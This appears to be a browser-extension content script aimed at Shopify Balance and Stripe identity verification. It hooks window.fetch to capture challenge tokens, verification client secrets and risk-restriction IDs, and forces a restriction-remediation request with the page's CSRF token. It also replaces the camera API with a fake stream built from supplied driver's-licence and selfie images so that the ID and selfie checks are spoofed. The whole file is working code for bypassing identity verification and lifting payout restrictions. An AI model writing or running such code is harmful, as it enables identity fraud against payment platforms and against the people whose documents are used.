// MAIN world — patches window.fetch, uses postMessage to send to bridge

const PATTERNS = [
  'banking_home_banking',
  'payments/banking',
  'shopify/graphql',
  'verificationhub.shopify.com',
  'verify.stripe.com'
]

function getStore() {
  const m = window.location.pathname.match(/\/store\/([^/?#]+)/)
  return m?.[1] ?? null
}

function gidToId(gid) {
  if (!gid) return null
  const m = String(gid).match(/\/(\d+)$/)
  return m ? m[1] : String(gid)
}

function parseCaptures(url, data) {
  const out = {}

  // Banking home
  if (url.includes('banking_home_banking') || url.includes('payments/banking')) {
    const ba = data.bankAccount || data?.data?.bankAccount
    if (ba?.id) {
      out.bank_account_id = gidToId(ba.id)
      out.bank_account_gid = ba.id
    }
    const restrictions = ba?.riskRestrictions || []
    out.risk_restrictions = restrictions.map(r => ({ id: gidToId(r.id), gid: r.id, status: r.status }))
    const active = restrictions.find(r => r.status === 'ACTIVE')
    if (active) {
      out.active_restriction_id = gidToId(active.id)
      out.active_restriction_gid = active.id
      out.active_restriction_status = 'ACTIVE'
    }
    const principal = data.principal || data?.data?.principal
    if (principal?.id) {
      out.principal_id = gidToId(principal.id)
      out.principal_gid = principal.id
    }
    out._event = 'banking_home'
  }

  // Shopify GraphQL / vhub
  if (url.includes('shopify/graphql') || url.includes('verificationhub.shopify.com')) {
    const d = data.data || {}

    // PGRR
    const pgrr = d.payoutGateRemediate
    if (pgrr?.challengeToken) {
      out.jwt = pgrr.challengeToken
      out.jwt_type = 'pgrr_challenge'
      out._event = 'pgrr_jwt_minted'
    }

    // remediateRiskRestriction
    const rrr = d.remediateRiskRestriction
    if (rrr?.challengeToken) {
      out.jwt = rrr.challengeToken
      out.jwt_type = 'remediate_challenge'
      out._event = 'remediate_risk_restriction'
    }

    // CIVA — get EK + client_secret
    for (const k of Object.keys(d)) {
      if (k.startsWith('createIVA') || k.startsWith('createIdentityVerification')) {
        const vs = d[k]?.verificationSession
        if (vs) {
          out.ek = vs.id
          out.ek_client_secret = vs.clientSecret
          out.assessment_ref = vs.referenceId
          out.civa_variant = k
          out._event = 'civa_ek_minted'
          break
        }
      }
    }

    // createAssessment (vhub)
    const ca = d.createAssessment
    if (ca?.assessmentReference) {
      out.vhub_assessment_ref = ca.assessmentReference
      out._event = 'vhub_assessment_created'
    }

    // Discharge poll
    const bh = d.shopifyPaymentsAccount?.bankAccount || d.bankAccount
    if (bh?.riskRestrictions !== undefined) {
      const hasActive = bh.riskRestrictions.some(r => r.status === 'ACTIVE')
      out.discharge_detected = !hasActive
      out._event = hasActive ? 'poll_still_active' : 'discharge_detected'
    }

    out._scope = url.includes('verificationhub') ? 'vhub' : 'shopify'
  }

  // Stripe
  if (url.includes('verify.stripe.com')) {
    const session = data.session || data
    if (session.status) {
      out.stripe_session_status = session.status
      out._event = 'stripe_status_' + session.status
    }
  }

  const pubKeys = Object.keys(out).filter(k => !k.startsWith('_'))
  return pubKeys.length > 0 ? out : null
}

function send(url, data) {
  const captures = parseCaptures(url, data)
  if (!captures) return
  window.postMessage({ _idv: 'CAPTURE', store: getStore(), url, captures, timestamp: Date.now() }, '*')
}

// Force verify via postMessage
window.addEventListener('message', async ev => {
  if (ev.source !== window || ev.data?._idv !== 'FORCE_VERIFY') return
  const csrf =
    document.querySelector('meta[name="csrf-token"]')?.getAttribute('content') ||
    window?.Shopify?.csrfToken || ''

  const mutation = `mutation RemediateIDV($id: ID!) {
    remediateRiskRestriction(input: { riskRestrictionId: $id }) {
      challengeToken
      userErrors { field message }
    }
  }`
  try {
    const res = await _origFetch('https://admin.shopify.com/api/shopify/graphql.json', {
      method: 'POST',
      credentials: 'include',
      headers: {
        'Content-Type': 'application/json',
        'Accept': 'application/json',
        ...(csrf ? { 'X-CSRF-Token': csrf } : {})
      },
      body: JSON.stringify({ operationName: 'RemediateIDV', query: mutation, variables: { id: ev.data.riskRestrictionId } })
    })
    const data = await res.json()
    send('https://admin.shopify.com/api/shopify/graphql.json', data)
    const rrr = data?.data?.remediateRiskRestriction
    if (rrr?.challengeToken) {
      window.postMessage({ _idv: 'FORCE_VERIFY_RESULT', result: { ok: true } }, '*')
    } else {
      const errs = rrr?.userErrors?.map(e => e.message).join(', ') || JSON.stringify(data).slice(0, 120)
      window.postMessage({ _idv: 'FORCE_VERIFY_RESULT', result: { ok: false, error: errs } }, '*')
    }
  } catch (e) {
    window.postMessage({ _idv: 'FORCE_VERIFY_RESULT', result: { ok: false, error: String(e) } }, '*')
  }
})

// ── Camera override (fake getUserMedia for Shopify Balance IDV) ───────────────
;(function patchCamera() {
  let _dlFront = null
  let _dlBack  = null
  let _selfie  = null
  let _phase   = 'id' // 'id' first, then 'selfie'

  // Receive images from bridge
  window.addEventListener('message', ev => {
    if (ev.source !== window) return
    if (ev.data?._idv === 'IDV_IMAGES') {
      _dlFront = ev.data.dlFront || null
      _dlBack  = ev.data.dlBack  || null
      _selfie  = ev.data.selfie  || null
    }
    if (ev.data?._idv === 'IDV_PHASE') {
      _phase = ev.data.phase
    }
  })

  const _origGUM = navigator.mediaDevices.getUserMedia.bind(navigator.mediaDevices)

  navigator.mediaDevices.getUserMedia = async function (constraints) {
    if (!constraints?.video) return _origGUM(constraints)

    // Pick image based on phase
    const src = _phase === 'selfie' ? _selfie : _dlFront
    if (!src) return _origGUM(constraints)

    const canvas = document.createElement('canvas')
    canvas.width  = 1280
    canvas.height = 720
    const ctx = canvas.getContext('2d')

    const img = new Image()
    img.src = src
    await new Promise(resolve => {
      img.onload = resolve
      img.onerror = resolve
    })

    function drawFrame() { ctx.drawImage(img, 0, 0, canvas.width, canvas.height) }
    drawFrame()
    const interval = setInterval(drawFrame, 100)

    const stream = canvas.captureStream(30)
    const origStop = stream.getTracks()[0].stop.bind(stream.getTracks()[0])
    stream.getTracks()[0].stop = function () { clearInterval(interval); origStop() }

    console.log('[IDV] Fake camera stream started (phase:', _phase, ')')

    // Auto-switch to selfie phase after ~8 seconds (ID scan completes, selfie step starts)
    if (_phase === 'id') {
      setTimeout(() => {
        window.postMessage({ _idv: 'IDV_PHASE_REQUEST' }, '*')
      }, 8000)
    }

    return stream
  }

  // Also patch enumerateDevices so camera permission prompt is minimal
  const _origEnum = navigator.mediaDevices.enumerateDevices.bind(navigator.mediaDevices)
  navigator.mediaDevices.enumerateDevices = async function () {
    const real = await _origEnum().catch(() => [])
    const hasVideo = real.some(d => d.kind === 'videoinput')
    if (!hasVideo) {
      real.push({ deviceId: 'fake', groupId: 'fake', kind: 'videoinput', label: 'IDV Camera' })
    }
    return real
  }
})()

// Patch fetch
const _origFetch = window.fetch.bind(window)
window.fetch = async function (input, init) {
  const res = await _origFetch(input, init)
  const url = typeof input === 'string' ? input : input instanceof URL ? input.href : input.url
  if (PATTERNS.some(p => url.includes(p))) {
    res.clone().json().then(data => send(url, data)).catch(() => {})
  }
  return res
}
